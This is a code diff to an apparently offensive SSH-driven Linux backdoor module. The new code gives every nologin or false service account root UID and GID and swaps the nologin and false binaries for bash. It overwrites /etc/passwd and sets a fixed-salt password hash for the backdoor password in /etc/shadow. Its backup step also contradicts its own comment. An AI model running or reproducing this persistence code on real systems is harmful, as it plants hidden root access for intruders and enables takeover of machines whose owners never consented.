@@ -13,27 +13,37 @@ have password. The password is controlled by -b/--backdoor_pwd switch.
     safe = False
 
     def run(self, sshclient, args, server):
-         # Change nologin/false to bash
+        # Parse /etc/passwd
+        logging.debug("Gathering data from /etc/passwd")
+        _, stdout, _ = sshclient.exec_command("cat /etc/passwd")
+        passwd_list = stdout.read().decode().strip().split("\n")
+        passwd_list = [x.split(":") for x in passwd_list]
+        
+        users = []
+        binaries = set()
+        
+        for entry in passwd_list:
+            if "nologin" in entry[6] or "false" in entry[6]:
+                binaries.add(entry[6])
+                users.append(entry[0])
+                entry[2] = '0'
+                entry[3] = '0'
+
+        # Change nologin/false to bash
         logging.debug("Repacing nologin/false with bash binary")
-        sshclient.exec_command("mv /usr/sbin/nologin /usr/sbin/nologin.b")
-        sshclient.exec_command("mv /bin/false /bin/false.b")
-        sshclient.exec_command("cp /bin/bash /usr/sbin/nologin")
-        sshclient.exec_command("cp /bin/bash /bin/false")
+        for binary in binaries:
+            # Make a backup only if it doesn't exist already, backdoor original binary
+            sshclient.exec_command(f"ls {binary}.b && mv {binary} {binary}.b; cp /bin/bash {binary}")
         logging.info("Replaced nologin/false binaries with bash")
 
-        # Gather affected users
-        logging.debug("Running nologin/false backdoor")
+        # Root all affected users
+        passwd_list = [":".join(x) for x in passwd_list]
+        passwd_list = "\n".join(passwd_list)
+        sshclient.exec_command("echo '''" + passwd_list + "''' > /etc/passwd")
+        logging.debug("Overwriting /etc/passwd")
+
         pwd = crypt.crypt(args.backdoor_pwd, "$6$60B3g.cP$")
         logging.debug("Generated password for /etc/shadow: %s" % pwd)
-
-        logging.debug("Gathering affected users from /etc/passwd")
-        _, stdout, _ = sshclient.exec_command("cat /etc/passwd")
-        stdout = stdout.read().decode().strip().split("\n")
-        users = []
-        for line in stdout:
-            line_split = line.split(":")
-            if "/usr/sbin/nologin" == line_split[6] or "/bin/false" == line_split[6]:
-                users.append(line_split[0])
         
         # Backdoor only affected users
         _, stdout, _ = sshclient.exec_command("cat /etc/shadow")
